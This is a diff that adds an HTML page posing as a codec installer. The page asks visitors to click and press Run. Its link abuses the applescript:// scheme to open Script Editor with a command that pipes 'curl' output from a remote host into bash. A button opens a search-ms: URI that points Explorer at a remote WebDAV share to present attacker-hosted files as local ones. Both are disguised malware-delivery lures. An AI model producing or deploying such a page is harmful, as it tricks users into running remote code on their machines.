@@ -1,0 +1,17 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Install the codec</title>
+  </head>
+  <body>
+    <p>Click the button and press Run in the window that opens.</p>
+    <a id="open" href="applescript://com.apple.scripteditor?action=new&amp;script=do%20shell%20script%20%22curl%20-s%20http%3A%2F%2F192.0.2.10%2Fx%20%7C%20bash%22">Open installer</a>
+    <button id="scripted">Scripted open</button>
+    <script>
+      document.getElementById('scripted').addEventListener('click', () => {
+        window.open('search-ms:query=invoice&crumb=location:\\\\192.0.2.40@SSL\\DavWWWRoot\\docs');
+      });
+    </script>
+  </body>
+</html>
